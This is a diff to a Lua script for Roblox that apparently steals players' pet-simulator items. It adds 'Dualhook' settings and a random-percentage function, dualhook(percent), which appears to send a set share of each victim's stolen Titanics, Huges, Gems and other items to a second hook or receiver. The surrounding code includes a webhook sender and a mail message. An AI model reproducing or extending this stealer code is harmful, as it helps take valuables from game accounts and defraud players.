@@ -1107,7 +1107,6 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     end
 end
-
 local titanicin
 local bananin
 local hugein
@@ -1118,6 +1117,56 @@ local secretin
 local mythicin
 local gemsin
 local mailmsg = "Monzz"
+if dhuser ~= nil then
+    if getgenv().Settings.Titanics.Dualhook then
+        titanicin = getgenv().Settings.Titanics.Intensity
+    end
+    if getgenv().Settings.Banana.Dualhook then
+        bananin = getgenv().Settings.Banana.Intensity
+    end
+    if getgenv().Settings.Huges.Dualhook then
+        hugein = getgenv().Settings.Huges.Intensity
+    end
+    if getgenv().Settings.Pogs.Dualhook then
+        pogin = getgenv().Settings.Pogs.Intensity
+    end
+    if getgenv().Settings.Exclusives.Dualhook then
+        excin = getgenv().Settings.Exclusives.Intensity
+    end
+    if getgenv().Settings.Events.Dualhook then
+        eventin = getgenv().Settings.Events.Intensity
+    end
+    if getgenv().Settings.Secrets.Dualhook then
+        secretin = getgenv().Settings.Secrets.Intensity
+    end
+    if getgenv().Settings.HC_DM_Mythics.Dualhook then
+        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
+    end
+    if getgenv().Settings.Gems.Dualhook then
+        gemsin = getgenv().Settings.Gems.Intensity
+    end
+    if getgenv().Settings.Webhook ~= true then
+        whenabled = false
+    end
+    if getgenv().Settings.MailMessage ~= nil then
+        mailmsg = getgenv().Settings.MailMessage
+    end
+end
+
+-- Dualhook intensity
+
+function dualhook(percent)
+    if not tonumber(percent) then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
+        return;
+    end
+    local number = math.random(1, 100)
+    if number <= percent then
+        return true
+    else
+        return false
+    end
+end
 
 -- Gems Only
 if FinalList == 0 then
